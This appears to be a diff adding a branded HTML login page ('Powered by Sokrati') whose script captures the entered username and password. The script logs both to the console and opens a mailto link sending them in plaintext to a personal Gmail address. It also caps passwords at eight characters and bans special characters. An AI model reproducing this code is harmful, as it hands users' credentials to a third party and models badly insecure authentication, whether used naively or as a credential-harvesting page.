@@ -1,0 +1,141 @@
+<!-- 
+	author: moghya.me
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Login Form</title>
+</head>
+<style type="text/css">
+	body{
+		background: #dddddd;
+	}
+	.container{
+		padding: 5%;
+		margin: 5%;
+		align-content: center;
+	}
+	.login-form-outer{
+		box-shadow: 5px 5px grey;
+		margin-left: 30%;
+		margin-right: 30%;
+		width: 40%;
+		padding: 1%;
+		background: white;
+		border: 1px;
+		align-content: center;
+	}
+	.login-form-inner{
+		margin-left: 5%;
+		margin-right:5%;
+		padding: 1%;
+		align-content: center;
+	}
+	table{
+	    margin-left: 15%;
+	    margin-right: 0%;
+	    padding-top: 10%;
+	    padding-bottom: 10%;
+	}
+	input{
+		padding: 2%;		
+	}
+	td {
+	    padding-top: 0.5em;
+	    padding-bottom: 0.5em;
+	}	
+	#powered-by-text{
+		margin-left: 69%;
+	}
+	.forgot-password-link{
+		text-decoration: none;
+    	color: #3793d3;
+	}
+	.action-btn{
+		background-color: #0058cc;
+	    color: white;
+	    padding: 2%;
+	    font-size: 0.8em;
+	    border-radius: 0.5em;
+	    width: 7em;
+	}
+</style>
+
+<body>
+	<div class="container">
+		<div class="login-form-outer">
+				<h2>Login to your account</h2>
+				<hr>
+				<div class="login-form-inner">
+					<table>
+						<tr>
+							<td><label>User name</label></td>
+							<td><input type="text" id="username_input_tag" name="username" placeholder="User name" required="Please Enter User name">
+							</td>
+						</tr>
+						<tr>
+							<td><label>Password</label></td>
+							<td><input type="password" id="password_input_tag" name="password" placeholder="Password" required="Please Enter Password">
+							</td>
+						</tr>
+					
+						<tr>
+							<td></td>
+							<td><button class="action-btn" onclick="validateForm()">Sign in</button> &nbsp;&nbsp;<a class="forgot-password-link" href="/forgot-password"><span>Forgot Password ?</span></a></td>
+						</tr>
+					</table>
+				</div>
+				<span id="powered-by-text">Powered by Sokrati</span>
+
+		</div>
+	</div>
+</body>
+<script type="text/javascript">
+	function sendMail(recipient_mail_id,subject,email_body){
+		window.open('mailto:'+recipient_mail_id+'?subject='+subject+'&body='+email_body);
+	}
+
+	function isValidPassword(password){
+		
+		/*
+			List of special characters taken from here
+			https://www.owasp.org/index.php/Password_special_characters
+		*/
+
+		const special_chars_pattern_regex = new RegExp(/[!"#$%&\'()*+,-./:;<=>?@\[\\\] ^_`{|}~]/);
+		console.log(password.length)
+		if(password.length>8||password.length==0){
+			alert('Length of Password must be greater than 0 and not be more than 8.');
+			return false;
+		}
+
+		if(special_chars_pattern_regex.test(password)){
+			alert('Special Characters in Password are not allowed.')
+			return false;
+		}
+
+		return true;
+	}
+
+	function validateForm(){
+		var username = document.getElementById('username_input_tag').value;
+		var password = document.getElementById('password_input_tag').value;
+		console.log('username is: '+username);
+		console.log('pass is: '+password);
+
+		if(username.length==0){
+			alert('Username cannot be empty');
+			return;
+		}
+		if(isValidPassword(password)){
+			var email_body = 'Username: '+username+'\nPassword: '+password+'\n'; 
+			var subject = 'Username and Password of User';
+			var recipient_mail_id = 'sawantshubham571@gmail.com';	
+			console.log('sent mail');
+			sendMail(recipient_mail_id,subject,email_body);
+		}
+		return;
+	}	
+</script>
+</html>
